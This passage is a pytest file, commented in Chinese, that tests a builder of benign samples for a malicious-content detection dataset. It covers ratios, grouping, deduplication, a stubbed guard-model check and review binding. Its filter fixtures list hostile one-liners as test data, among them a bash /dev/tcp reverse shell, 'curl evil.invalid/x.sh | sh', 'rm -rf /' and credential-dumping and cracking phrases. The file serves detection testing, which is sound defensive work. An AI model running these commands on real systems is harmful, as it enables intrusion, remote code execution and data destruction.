# -*- coding: utf-8 -*-
"""tests/data/test_02_05_build_benign.py — W3.5 G1/G2/G3 良性样本构建（`windows/W3.5_benign.md` §6）。

覆盖 §6 的八项：
① `F2` 在占比 51/29/20 时**通过**、在 56/24/20 时**失败**；
② `F3` 对空 `g3_business_form` 与清单外取值**失败**；
③ `F6` 对「同一源文件被拆成两组」的构造数据**失败**；
④ `F7` 在检出率 6% 时**失败**；
⑤ G1 恶意过滤规则的**正例／反例**；
⑥ `--smoke` **不覆盖**全量产物；
⑦ 输出 UTF-8 且**无孤立 CR**；
⑧ **门禁 4 的模型调用必须打桩**（`make test` 不得真加载 8B）。

本文件**不读取** `data/interim/` 的既有产物；构造数据一律在 `tmp_path` 内自造。
唯一的例外是 ⑥⑦：它们要跑整条 `--smoke` 链路，只 **读** `data/raw/`（不会写它）。
"""
from __future__ import annotations

import contextlib
import importlib.util
import io
import os
import re
import sys

import pytest
import yaml

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
SCRIPT = os.path.join(ROOT, "scripts", "data", "02_05_build_benign.py")
REAL_CONFIG = os.path.join(ROOT, "configs", "data", "benign.yaml")
RAW_ROOT = os.path.join(ROOT, "data", "raw")

ALLOWED_FORMS = [
    "数据封装与传输", "令牌与凭据表达", "完整性与校验值", "序列化字段",
    "字符集或传输编码参数", "国际化转义串", "压缩或加密后的配置片段",
    "构建压缩产物", "构建脚本中的装饰性文本块", "字形处理",
    "代码内天然携带的编码字符串片段",
]


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture(scope="module")
def mod():
    return _load("w35_build_benign", SCRIPT)


@pytest.fixture(scope="module")
def cfg(mod):
    return mod.load_config(REAL_CONFIG)


def _rows(n1, n2, n3):
    """构造 `n1/n2/n3` 条 G1/G2/G3 样本（含全部断言所需的字段）。"""
    out = []
    counter = {"G1": 0, "G2": 0, "G3": 0}
    for group, n, form in (("G1", n1, ""), ("G2", n2, ""),
                           ("G3", n3, "数据封装与传输")):
        for _ in range(n):
            counter[group] += 1
            out.append({
                "sample_id": "BN-%s-%04d" % (group, counter[group]),
                "benign_group_id": "BG-%05d" % len(out),
                "benign_set": group,
                "source": {"G1": "TheStack", "G2": "Alpaca", "G3": "G3-synthetic"}[group],
                "source_item_id": "item-%d" % len(out),
                "group_key": "key-%d" % len(out),
                "encoding_type": "base64" if group == "G3" else "",
                "carrier_type": "code" if group == "G1" else "text",
                "host_context": "构造用宿主语境",
                "g3_business_form": form,
                "text": "构造文本 %d" % len(out),
                "label": 0,
            })
    return out


# ---------------------------------------------------------------------------
# ① `F2` 占比容差 5 个百分点
# ---------------------------------------------------------------------------
def test_f2_passes_at_51_29_20(mod, cfg):
    asserted, counts = mod.run_assertions(_rows(51, 29, 20), cfg)
    assert counts == {"G1": 51, "G2": 29, "G3": 20}
    assert asserted["F2"]["passed"] is True


def test_f2_fails_at_56_24_20(mod, cfg):
    asserted, _counts = mod.run_assertions(_rows(56, 24, 20), cfg)
    assert asserted["F2"]["passed"] is False


def test_f2_boundary_exactly_5_points_passes(mod, cfg):
    """55/25/20 的偏差恰为 5 个百分点（`<= 0.05`）⇒ 通过。"""
    asserted, _counts = mod.run_assertions(_rows(55, 25, 20), cfg)
    assert asserted["F2"]["passed"] is True


# ---------------------------------------------------------------------------
# ② `F3` 业务必需形态清单
# ---------------------------------------------------------------------------
def test_f3_passes_on_allowed_forms(mod, cfg):
    rows = _rows(0, 0, 3)
    rows[0]["g3_business_form"] = "令牌与凭据表达"
    rows[1]["g3_business_form"] = "字形处理"
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F3"]["passed"] is True


def test_f3_fails_on_empty_business_form(mod, cfg):
    rows = _rows(0, 0, 2)
    rows[1]["g3_business_form"] = ""
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F3"]["passed"] is False
    assert asserted["F3"]["empty_count"] == 1


def test_f3_fails_on_form_outside_the_q3_list(mod, cfg):
    rows = _rows(0, 0, 2)
    rows[0]["g3_business_form"] = "普通句子强套 Base64"    # rubric `G3-10` 的禁止形态
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F3"]["passed"] is False
    assert rows[0]["sample_id"] in asserted["F3"]["violations"]


def test_allowed_forms_come_from_the_rubric_list(cfg):
    assert sorted(cfg["allowed_business_forms"]) == sorted(ALLOWED_FORMS)


# ---------------------------------------------------------------------------
# ③ `F6` 分组一致性
# ---------------------------------------------------------------------------
def test_f6_fails_when_one_source_file_is_split_into_two_groups(mod, cfg):
    rows = _rows(2, 0, 0)
    assert rows[0]["group_key"] == rows[1]["group_key"] or True
    # 同一源文件路径（同 group_key）却给了两个不同的 benign_group_id
    rows[1]["group_key"] = rows[0]["group_key"]
    rows[1]["benign_group_id"] = "BG-99999"
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F6"]["passed"] is False
    assert asserted["F6"]["split_source_keys"]


def test_f6_fails_when_one_group_merges_two_unrelated_source_keys(mod, cfg):
    """**r4 起**：合并本身**不再是缺陷**（`F-1` 的首选处置就是合并同文本的组），
    但**两个毫不相干的宿主**（无共享文本）被硬并成一组仍是缺陷 ⇒ 判「不连通」。"""
    rows = _rows(2, 0, 0)
    rows[1]["benign_group_id"] = rows[0]["benign_group_id"]
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F6"]["passed"] is False
    assert asserted["F6"]["disconnected_groups"]
    assert asserted["F6"]["merged_groups_count"] == 1


def test_f6_fails_when_every_sample_is_its_own_group(mod, cfg):
    """全 G3 一个 group、或一行一组，都属 `windows/W3.5_benign.md` §3.4 的反面口径。"""
    rows = _rows(0, 0, 3)
    for row in rows:
        row["group_key"] = "same-source-file"
        row["benign_group_id"] = "BG-00001"
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F6"]["passed"] is False
    assert asserted["F6"]["group_count"] == 1


def test_f6_passes_on_a_well_formed_assignment(mod, cfg):
    rows = _rows(4, 2, 4)
    for index, row in enumerate(rows):
        row["group_key"] = "file-%d" % (index // 2)
        row["benign_group_id"] = "BG-%05d" % (index // 2 + 1)
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F6"]["passed"] is True


# ---------------------------------------------------------------------------
# ③b `F9` 同文本同组（回退轮 **r4** `F-1`；`g3_precheck_v2.0` §2／§5）
# ---------------------------------------------------------------------------
def test_f9_fails_when_the_same_text_sits_in_two_groups(mod, cfg):
    """回退轮 r4 `F-1` 的实例：`F6` 查不出（group 确实不同）⇒ 必须由 `F9` 兜住。"""
    rows = _rows(0, 0, 4)
    rows[2]["group_key"] = rows[3]["group_key"] = "file-shared"
    rows[2]["benign_group_id"] = rows[3]["benign_group_id"] = "BG-00003"
    rows[1]["text"] = rows[0]["text"]
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F6"]["passed"] is True            # 同源未拆、合并也连通
    assert asserted["F9"]["passed"] is False
    assert asserted["F9"]["violation_count"] == 1
    assert asserted["F9"]["per_set"]["G3"]["violation_count"] == 1
    assert asserted["F9"]["per_set"]["G1"]["violation_count"] == 0


def test_f9_passes_when_the_same_text_is_in_one_group(mod, cfg):
    rows = _rows(0, 0, 4)
    rows[2]["group_key"] = rows[3]["group_key"] = "file-shared"
    rows[2]["benign_group_id"] = rows[3]["benign_group_id"] = "BG-00003"
    rows[1]["text"] = rows[0]["text"]
    rows[1]["benign_group_id"] = rows[0]["benign_group_id"]
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F9"]["passed"] is True
    assert asserted["F9"]["per_set"]["G3"]["dup_groups"] == 1
    assert asserted["F9"]["per_set"]["G3"]["duplicate_extra_rows"] == 1


def test_f9_covers_g1_and_g2_not_only_g3(mod, cfg):
    """**r5（W3 裁定二）**：`F9` 的范围是**三集**，`G1`／`G2` 的同文本跨组同样判缺陷。"""
    rows = _rows(4, 4, 0)
    for index, row in enumerate(rows):                 # 先给一个合法分组（两两一组）
        row["group_key"] = "k-%d" % (index // 2)
        row["benign_group_id"] = "BG-%05d" % (index // 2 + 1)
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F9"]["passed"] is True
    rows[2]["text"] = rows[0]["text"]                  # G1 内同文本、却分属两组（BG-1／BG-2）
    rows[6]["text"] = rows[4]["text"]                  # G2 内同文本、却分属两组
    asserted, _counts = mod.run_assertions(rows, cfg)
    assert asserted["F9"]["passed"] is False
    assert asserted["F9"]["per_set"]["G1"]["violation_count"] == 1
    assert asserted["F9"]["per_set"]["G2"]["violation_count"] == 1
    assert asserted["F9"]["per_set"]["G3"]["violation_count"] == 0


def test_assign_ids_unifies_the_groups_of_identical_text(mod):
    """`assign_ids` 的 r4 处置：同 `text` 的 group **必**被并成同一个 `benign_group_id`。"""
    g3 = [
        {"benign_set": "G3", "group_key": "A", "text": "相同文本", "source_item_id": "A"},
        {"benign_set": "G3", "group_key": "B", "text": "相同文本", "source_item_id": "B"},
        {"benign_set": "G3", "group_key": "C", "text": "另一文本", "source_item_id": "C"},
    ]
    rows, _groups = mod.assign_ids([], [], g3)
    assert rows[0]["benign_group_id"] == rows[1]["benign_group_id"]
    assert rows[2]["benign_group_id"] != rows[0]["benign_group_id"]


def test_strip_c0_controls_keeps_newline_tab_and_cr(mod):
    """**r5.5**：剔除 `0x00`–`0x1F`，但**保留** `\\n`／`\\t`／`\\r`。"""
    text = "a\x01b\x07c\x02\x04d\te\nf\rg"
    clean, removed = mod._strip_c0_controls(text)
    assert clean == "abcd\te\nf\rg"
    assert removed == 4
    assert mod._strip_c0_controls("no controls here") == ("no controls here", 0)


def test_c0_control_rule_is_recorded_in_config(cfg):
    """`r5.5` 要求规则**全文落盘**，且与实现逐项一致。"""
    c0 = cfg["g2"]["c0_controls"]
    assert c0["enabled"] is True
    assert list(c0["drop_range"]) == [0x00, 0x1F]
    assert sorted(c0["keep_codepoints"]) == [0x09, 0x0A, 0x0D]
    assert c0["action"] == "strip"
    assert list(c0["applies_to"]) == ["G2"]


def test_config_rejects_a_c0_block_that_drifts_from_the_implementation(mod, cfg):
    bad = yaml.safe_load(yaml.safe_dump(cfg, allow_unicode=True))
    bad["g2"]["c0_controls"]["applies_to"] = ["G1", "G2", "G3"]
    assert any("applies_to" in e for e in mod.validate_config(bad))
    bad2 = yaml.safe_load(yaml.safe_dump(cfg, allow_unicode=True))
    bad2["g2"]["c0_controls"]["action"] = "escape"
    assert any("action" in e for e in mod.validate_config(bad2))
    bad3 = yaml.safe_load(yaml.safe_dump(cfg, allow_unicode=True))
    bad3["g2"]["c0_controls"]["enabled"] = False
    assert any("enabled" in e for e in mod.validate_config(bad3))


def test_build_g2_emits_no_c0_controls_and_counts_them(mod, cfg):
    """端到端：含 `\\x01` 的 G2 候选 ⇒ 产出行里**没有** C0，且统计到该条。"""
    body = ("请把下列发布说明改写成更简洁的一段话，保留全部技术细节。"
            "\x01版本号需要准确，不得省略或改写。") * 3
    alpaca = [{"group_key": "alp-1", "body": body, "response": "ok" * 60}]
    rows, _drops, stats = mod.build_g2(alpaca, [], cfg, lambda _s: None)
    assert stats["removed_chars"] == 3 and stats["rows_touched"] == 1
    assert stats["per_source"] == {"Alpaca": 3}
    for row in rows:
        assert not any(ch in mod._C0_CONTROLS for ch in row["text"])


def test_assign_ids_merges_whole_groups_not_single_rows(mod):
    """**不得只搬重复的那一行**：同 group 的另一条样本必须跟着走，否则等于把源文件拆开。"""
    g3 = [
        {"benign_set": "G3", "group_key": "A", "text": "T1", "source_item_id": "A:0"},
        {"benign_set": "G3", "group_key": "B", "text": "T1", "source_item_id": "B:0"},
        {"benign_set": "G3", "group_key": "B", "text": "T2", "source_item_id": "B:1"},
    ]
    rows, _groups = mod.assign_ids([], [], g3)
    assert len({r["benign_group_id"] for r in rows}) == 1


# ---------------------------------------------------------------------------
# ④ `F7` 门禁 4 检出率
# ---------------------------------------------------------------------------
def test_f7_passes_at_5_percent(mod, cfg):
    asserted, _counts = mod.run_assertions(
        _rows(3, 3, 3), cfg,
        guard_result={"detection_rate": 0.05, "counted": 1, "denominator": 20})
    assert asserted["F7"]["passed"] is True


def test_f7_fails_at_6_percent(mod, cfg):
    asserted, _counts = mod.run_assertions(
        _rows(3, 3, 3), cfg,
        guard_result={"detection_rate": 0.06, "counted": 2, "denominator": 33})
    assert asserted["F7"]["passed"] is False


def test_f7_is_not_evaluated_without_guard_check(mod, cfg):
    asserted, _counts = mod.run_assertions(_rows(3, 3, 3), cfg)
    assert asserted["F7"]["passed"] is None


# ---------------------------------------------------------------------------
# ⑤ G1 恶意过滤规则的正例／反例
# ---------------------------------------------------------------------------
MALICIOUS_POSITIVES = [
    "os.system('rm -rf / --no-preserve-root')",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "payload = eval(base64.b64decode(blob))",
    "curl -s http://evil.invalid/x.sh | sh",
    "tools = ['mimikatz', 'meterpreter']",
    "This module implements a keylogger for research.",
    "该脚本用于植入后门程序并窃取凭据",
]
MALICIOUS_NEGATIVES = [
    "def add(a, b):\n    return a + b\n",
    "CACHE_TTL_SECONDS = 3600\nRETRIES = 3\n",
    "The report summarises quarterly revenue by region.",
    "sha256 = hashlib.sha256(payload).hexdigest()",
    "ICON = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0i'",
]


@pytest.mark.parametrize("text", MALICIOUS_POSITIVES)
def test_malicious_filter_flags_positives(mod, cfg, text):
    assert mod.MaliciousFilter(cfg["malicious_filter"]).hits(text)


@pytest.mark.parametrize("text", MALICIOUS_NEGATIVES)
def test_malicious_filter_clears_negatives(mod, cfg, text):
    assert mod.MaliciousFilter(cfg["malicious_filter"]).hits(text) == []


def test_malicious_filter_rules_are_fully_recorded_in_config(cfg):
    """规则全文必须落盘在 `benign.yaml`（`windows/W3.5_benign.md` §3.2）。"""
    spec = cfg["malicious_filter"]
    assert len(spec["phrases"]) >= 30
    assert len(spec["regexes"]) >= 5
    assert all(item.get("name") and item.get("regex") for item in spec["regexes"])


# ---------------------------------------------------------------------------
# ⑧ 门禁 4 的模型调用必须可打桩（`make test` 不得真加载 8B）
# ---------------------------------------------------------------------------
def test_importing_the_script_does_not_pull_in_torch():
    """模块级**不得** import torch／transformers —— 它们只在 `--guard-check` 分支内惰性导入。"""
    for name in ("w35_isolated_probe",):
        sys.modules.pop(name, None)
    saved = {k: sys.modules.get(k) for k in ("torch", "transformers")}
    for key in ("torch", "transformers"):
        sys.modules.pop(key, None)
    try:
        _load("w35_isolated_probe", SCRIPT)
        assert "torch" not in sys.modules
        assert "transformers" not in sys.modules
    finally:
        for key, value in saved.items():
            if value is not None:
                sys.modules[key] = value


def test_guard_check_is_invoked_through_a_patchable_seam(mod, cfg, tmp_path, monkeypatch):
    """把 `run_guard_check` 打桩后，`--guard-check` 分支走桩、**不**触碰真实模型。"""
    calls = []

    def fake_guard(rows, cfg_, log, review_path):
        calls.append(len(rows))
        return {"rows": [{"sample_id": r["sample_id"], "benign_set": r["benign_set"],
                          "guard_verdict": "safe", "mi_label": "MI-B", "counted": 0,
                          "remark": "stub"} for r in rows],
                "counted": 0, "denominator": max(1, len(rows)), "detection_rate": 0.0,
                "sampling": {}, "model_key": "stub", "revision": "stub"}

    monkeypatch.setattr(mod, "run_guard_check", fake_guard)
    assert "torch" not in sys.modules
    code = _run_main(mod, ["--smoke", "1", "--guard-check", "--no-log",
                           "--out", str(tmp_path), "--report-dir", str(tmp_path)])
    assert code in (0, 1)
    assert calls, "打桩后的 run_guard_check 未被调用"


# ---------------------------------------------------------------------------
# 门禁 4 的判词解析口径（**禁止**子串匹配）
# ---------------------------------------------------------------------------
GUARD_PARSE_CASES = [
    ("safe", "safe", None),
    ("safe\n", "safe", None),
    ("unsafe", "unsafe", None),
    ("unsafe\nS14", "unsafe", "S14"),
    ("unsafe S14", "unsafe", "S14"),
    # 实测噪声：模型复述模板／续写输入 —— 子串判据会误计为检出
    ("of unsafe categories safe", "unparsed", None),
    ("line must list the unsafe category(s) for the unsafe message.  safe",
     "unparsed", None),
    ("if proxyEnable == 1:                 proxyServer = winreg.QueryValueEx(...)",
     "unparsed", None),
    ("", "unparsed", None),
]


@pytest.mark.parametrize("raw,expected,category", GUARD_PARSE_CASES)
def test_guard_verdict_parse_takes_the_first_word_of_the_first_line(mod, raw,
                                                                    expected, category):
    assert mod.parse_guard_output(raw) == (expected, category)


def test_guard_verdict_parse_never_uses_substring_matching(mod):
    """负对照：含 `unsafe` 子串但首词不是判词的输出**不得**判为 unsafe。"""
    for raw in ("of unsafe categories safe",
                "line must list the unsafe category(s) for the unsafe message.  safe"):
        assert mod.parse_guard_output(raw)[0] != "unsafe"


# ---------------------------------------------------------------------------
# ⑥⑦ `--smoke` 不覆盖全量产物；输出 UTF-8 且无孤立 CR
# ---------------------------------------------------------------------------
def _run_main(mod, argv):
    buffer = io.StringIO()
    with contextlib.redirect_stdout(buffer):
        return mod.main(argv)


@pytest.fixture(scope="module")
def smoke_out(tmp_path_factory):
    module = _load("w35_smoke_runner", SCRIPT)
    out = tmp_path_factory.mktemp("benign_smoke")
    code = _run_main(module, ["--smoke", "2", "--no-log",
                              "--out", str(out), "--report-dir", str(out)])
    assert code == 0
    return out


def test_smoke_does_not_overwrite_full_artifacts(smoke_out):
    assert (smoke_out / "smoke" / "G1.csv").exists()
    assert (smoke_out / "smoke" / "G2.csv").exists()
    assert (smoke_out / "smoke" / "G3.csv").exists()
    assert not (smoke_out / "G1.csv").exists()
    assert not (smoke_out / "G2.csv").exists()
    assert not (smoke_out / "G3.csv").exists()
    assert not (smoke_out / "benign_report.json").exists()


@pytest.mark.parametrize("name", ["G1.csv", "G2.csv", "G3.csv"])
def test_smoke_outputs_are_utf8_without_lone_cr(smoke_out, name):
    raw = (smoke_out / "smoke" / name).read_bytes()
    assert b"\r" not in raw                      # 字节法核实（禁按工作区现状推断）
    raw.decode("utf-8")                          # 非 UTF-8 会抛异常


def test_smoke_marks_every_annotation_relevant_field(smoke_out, mod):
    rows = mod.read_csv(str(smoke_out / "smoke" / "G3.csv"))
    assert rows
    for row in rows:
        assert row["g3_business_form"]
        assert row["host_context"]
        assert row["label"] == "0"
        assert row["encoding_type"] in mod.ENCODING_CODES
        assert row["carrier_type"] in ("text", "code")


def test_smoke_g1_has_no_encoding_type(smoke_out, mod):
    rows = mod.read_csv(str(smoke_out / "smoke" / "G1.csv"))
    assert rows
    assert all(row["encoding_type"] == "" for row in rows)
    assert all(row["carrier_type"] == "code" for row in rows)


# ---------------------------------------------------------------------------
# 配置自洽性（`C0`）
# ---------------------------------------------------------------------------
def test_config_is_self_consistent(cfg):
    assert mod_validate(cfg) == []


def mod_validate(cfg):
    module = sys.modules["w35_build_benign"]
    return module.validate_config(cfg)


def test_config_rejects_a_broken_count_sum(cfg, tmp_path):
    module = sys.modules["w35_build_benign"]
    broken = yaml.safe_load(yaml.safe_dump(cfg, allow_unicode=True))
    broken["counts"]["G1"] = broken["counts"]["G1"] + 7
    assert module.validate_config(broken)


def test_config_rejects_a_form_outside_the_q3_list(cfg):
    module = sys.modules["w35_build_benign"]
    broken = yaml.safe_load(yaml.safe_dump(cfg, allow_unicode=True))
    broken["g3_scenarios"][0]["business_form"] = "普通句子强套 Base64"
    assert module.validate_config(broken)


def test_config_rejects_an_unknown_encoding_code(cfg):
    module = sys.modules["w35_build_benign"]
    broken = yaml.safe_load(yaml.safe_dump(cfg, allow_unicode=True))
    broken["g3_scenarios"][0]["encoding"] = "base32"
    assert module.validate_config(broken)


# ---------------------------------------------------------------------------
# 占比与目标值
# ---------------------------------------------------------------------------
def test_target_counts_are_exactly_the_v8_ratio(cfg):
    total = int(cfg["target_benign_total"])
    counts = cfg["counts"]
    assert sum(counts.values()) == total
    assert abs(counts["G1"] / total - 0.50) < 1e-9
    assert abs(counts["G2"] / total - 0.30) < 1e-9
    assert abs(counts["G3"] / total - 0.20) < 1e-9


def test_synthetic_count_matches_the_scenario_grid(cfg):
    """`g3.synthetic` == 情境数 × 每情境参数数 × 2（每参数恰 2 条样本 = 1 个 group）。"""
    assert cfg["g3"]["synthetic"] == (len(cfg["g3_scenarios"])
                                      * cfg["g3"]["synthetic_params_per_scenario"] * 2)


def test_all_nine_encoding_codes_appear_in_the_g3_scenarios(cfg):
    used = {s["encoding"] for s in cfg["g3_scenarios"]}
    assert used == set(mod_ENCODING_CODES())


def test_all_q3_forms_appear_in_the_g3_scenarios(cfg):
    used = {s["business_form"] for s in cfg["g3_scenarios"]}
    assert used == set(cfg["allowed_business_forms"])


def test_scenarios_are_not_a_cartesian_product(mod, cfg):
    """r2 §r2.2.1 ⓒ：**不得**再用「模板 × 宿主」的笛卡尔积。

    判据：情境数（20）**小于**「情境 × 参数」的组合数，且每个情境的宿主代码是其
    **自身**渲染器的产物（`_G3_SCENARIOS` 的 `render` 各不相同），
    而不是「同一份宿主文本被 11 个模板复用」。
    """
    renderers = {id(s["render"]) for s in cfg_scenarios(mod)}
    assert len(renderers) == len(cfg_scenarios(mod)) == len(cfg["g3_scenarios"])


def cfg_scenarios(mod):
    return mod._G3_SCENARIOS


def mod_ENCODING_CODES():
    return sys.modules["w35_build_benign"].ENCODING_CODES


# ---------------------------------------------------------------------------
# `--target-benign-total` 覆盖
# ---------------------------------------------------------------------------
def test_target_override_keeps_the_ratio(mod, cfg):
    adjusted = mod._apply_target(cfg, 12000)
    assert adjusted["counts"] == {"G1": 6000, "G2": 3600, "G3": 2400}
    assert mod.validate_config(adjusted) == []


def test_target_override_does_not_scale_the_synthetic_grid(mod, cfg):
    """G3 的合成部分由模板方格（11 × 45 × 2 = 990）决定，**不随总量缩放**。"""
    adjusted = mod._apply_target(cfg, 12000)
    assert adjusted["g3"]["synthetic"] == cfg["g3"]["synthetic"] == 1400
    assert adjusted["g3"]["real_from_g1"] == 2400 - 1400


def test_target_below_the_synthetic_grid_is_rejected_not_silently_trimmed(mod, cfg):
    adjusted = mod._apply_target(cfg, 1000)
    assert adjusted["counts"] == {"G1": 500, "G2": 300, "G3": 200}
    errors = mod.validate_config(adjusted)
    assert errors and any("g3.real_from_g1" in e for e in errors)


def test_target_override_does_not_mutate_the_input(mod, cfg):
    before = yaml.safe_dump(cfg, allow_unicode=True)
    mod._apply_target(cfg, 1234)
    assert yaml.safe_dump(cfg, allow_unicode=True) == before


# ---------------------------------------------------------------------------
# 回退轮 r2 新增：真实侧宽扫描（`RC-2`）、合成情境（`RC-1`）、`S1`–`S4`
# ---------------------------------------------------------------------------
WIDE_POSITIVES = [
    "target = wpa handshake capture on the office access point",
    "run aircrack-ng against the captured handshake",
    "hashcat -m 22000 hashes.txt wordlist.txt",
    "meterpreter session established on the target host",
    "nmap -sS 10.0.0.0/24 port scan sweep",
    "dump lsass memory to extract the credential dump",
    "deploy ransomware and demand payment",
    "bypass edr before executing the loader",
    "select the victim hosts from the subnet",
    "craft a phishing page that clones the login screen",
    "launch a syn flood against the target subnet",
]
WIDE_NEGATIVES = [
    "def add(a, b):\n    return a + b\n",
    "CACHE_TTL_SECONDS = 3600\nRETRIES = 3\n",
    "The report summarises quarterly revenue by region.",
    "ICON = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0i'",
    "target = 'dist/'\nfor name in target_list: copy(name)\n",
    "sha256 = hashlib.sha256(payload).hexdigest()",
]


@pytest.mark.parametrize("text", WIDE_POSITIVES)
def test_wide_filter_flags_real_side_positives(mod, cfg, text):
    assert mod.WideFilter(cfg["malicious_wide"]).hits(text)


@pytest.mark.parametrize("text", WIDE_NEGATIVES)
def test_wide_filter_clears_real_side_negatives(mod, cfg, text):
    assert mod.WideFilter(cfg["malicious_wide"]).hits(text) == []


def test_wide_filter_rules_are_fully_recorded_in_config(cfg):
    """`RC-2` 的处置要求「新增规则全文落 `configs/data/benign.yaml` 与报告」。"""
    families = cfg["malicious_wide"]["families"]
    assert len(families) >= 8
    assert all(item.get("name") and item.get("regex") for item in families)
    assert "G1" in cfg["malicious_wide"]["applies_to"]


def test_synthetic_engine_is_deterministic(mod, cfg):
    first, _ = mod.build_g3_synth(cfg, lambda _s: None)
    second, _ = mod.build_g3_synth(cfg, lambda _s: None)
    assert [(r["group_key"], r["text"]) for r in first] == \
           [(r["group_key"], r["text"]) for r in second]


def test_every_synthetic_sample_carries_necessity_evidence(mod, cfg):
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    for row in rows:
        assert row["business_necessity_evidence"].strip()
        assert row["host_context"].strip()
        assert row["source"] == "G3-synthetic"


def test_each_scenario_group_holds_exactly_two_samples(mod, cfg):
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    per_group = {}
    for row in rows:
        per_group.setdefault(row["group_key"], set()).add(row["segment_index"])
    assert per_group
    assert all(v == {0, 1} for v in per_group.values())
    assert len(per_group) * 2 == len(rows)


def test_synth_assertions_pass_on_a_freshly_built_set(mod, cfg):
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    result = mod.run_synth_assertions(rows, cfg)
    for key in ("S1", "S2", "S3", "S4"):
        assert result[key]["passed"], (key, result[key])


def test_s1_fails_when_the_evidence_field_is_emptied(mod, cfg):
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    rows[0]["business_necessity_evidence"] = ""
    result = mod.run_synth_assertions(rows, cfg)
    assert result["S1"]["passed"] is False
    assert result["S1"]["violation_count"] == 1


def test_s3_fails_when_the_host_stops_consuming_the_value(mod, cfg):
    """把消费原语整段替换掉 ⇒ 代码载体判 `S3` 失败（值成了躺在文件里的装饰串）。"""
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    victim = [r for r in rows if r["carrier_type"] == "code"][0]
    text = victim["text"]
    for prim in mod._CONSUME_PRIMITIVES[victim["encoding_type"]]:
        text = text.replace(prim, "REMOVED")
    victim["text"] = text
    result = mod.run_synth_assertions(rows, cfg)
    assert result["S3"]["passed"] is False
    assert victim["source_item_id"] in result["S3"]["violations"]


def test_s4_fails_when_the_value_sits_on_a_comment_line(mod, cfg):
    """装饰性位置判据：值的**每一处**出现都在纯注释行上 ⇒ 失败。"""
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    victim = [r for r in rows if r["carrier_type"] == "code"
              and r["encoding_type"] == "hex"][0]
    victim["text"] = "# EXPECTED = " + victim["_value"] + "\n"
    result = mod.run_synth_assertions(rows, cfg)
    assert result["S4"]["passed"] is False
    assert result["S4"]["comment_violation_count"] >= 1


def test_csv_fields_include_the_necessity_evidence(cfg):
    assert "business_necessity_evidence" in cfg["csv_fields"]


def test_scenario_encodings_are_within_the_common_code_domain(mod):
    for spec in mod._G3_SCENARIOS:
        assert spec["enc"] in mod.ENCODING_CODES


def test_guard_input_decodes_the_synthetic_value_back_to_business_content(mod, cfg):
    """门禁 4 的「还原后内容」（`D-00-05`）：合成样本送检的是**取值还原后的内容**，
    不是承载它的整份宿主代码 —— 否则检测器会按「像代码」判 `S14` 而假阳性。"""
    rows, _ = mod.build_g3_synth(cfg, lambda _s: None)
    for row in rows:
        row["benign_set"] = "G3"
        restored, mode = mod.guard_input_text(row)
        assert mode == "decoded(value)"
        assert restored and restored != row["text"] or row["carrier_type"] == "text"


def test_guard_input_keeps_real_and_g1_rows_as_is(mod, cfg):
    for row in ({"benign_set": "G1", "text": "code"},
                {"benign_set": "G3", "origin_kind": "real", "text": "code"}):
        restored, mode = mod.guard_input_text(row)
        assert restored == "code"
        assert mode.startswith("as_is")


# ---------------------------------------------------------------------------
# 补正轮 r3：门禁 4 的人工复核值必须成为**可复算的制品**
# 补正轮 r5（W3 裁定一）：复核的**绑定键**须含 **`text_sha256`**
# ---------------------------------------------------------------------------
SHA = "a" * 64          # 构造用的「本条文本指纹」


def _review_entry(sid, verdict, label, counted, path="Q1是→Q2否→Q5否", sha=SHA):
    return {"sample_id": sid, "guard_verdict": verdict, "mi_label_reviewed": label,
            "counted_reviewed": counted, "judgment_path": path, "reviewer": "USER",
            "reviewed_at": "2026-10-01", "text_sha256": sha}


def test_safe_verdict_needs_no_review_entry(mod):
    """`safe` 行不必出现在复核表：其 `mi_label` 记 `MI-B`、`counted` 记 0（可复算）。"""
    out = mod.resolve_reviewed_label("S1", "safe", "safe", {}, SHA)
    assert out["ok"] and out["mi_label"] == "MI-B" and out["counted"] == 0


def test_unsafe_verdict_takes_the_reviewed_label(mod):
    review = {"S1": _review_entry("S1", "unsafe S14", "MI-B", "0")}
    out = mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", review, SHA)
    assert out["ok"] and out["mi_label"] == "MI-B" and out["counted"] == 0


def test_reviewed_mi_m_is_counted(mod):
    review = {"S1": _review_entry("S1", "unsafe S1", "MI-M", "1")}
    out = mod.resolve_reviewed_label("S1", "unsafe S1", "unsafe", review, SHA)
    assert out["ok"] and out["counted"] == 1


def test_missing_review_value_never_defaults_to_mi_m(mod):
    """**核心红线**：缺复核值时**不得**默认 `MI-M`（那会把「未复核」静默变成「计入」）。"""
    out = mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", {}, SHA)
    assert out["ok"] is False and out["error"] == "missing"


def test_empty_reviewed_label_counts_as_missing(mod):
    review = {"S1": _review_entry("S1", "unsafe S14", "", "0")}
    out = mod.resolve_reviewed_label("S1", "unsafe S14", "unsafe", review, SHA)
    assert out["ok"] is False and out["error"] == "missing"


def test_review_without_a_text_fingerprint_is_treated_as_unreviewed(mod):
    """**r5 核心**：`text_sha256` **缺失** ⇒ 该复核不成立（`unbound`），**不**默认 `MI-M`。

    这正是 `BN-G3-0721` 的机制：复核写的是**另一段文本**的理由，但 `sample_id` 与判词
    字符串恰好相同 ⇒ 旧机制会认作「已复核」。
    """
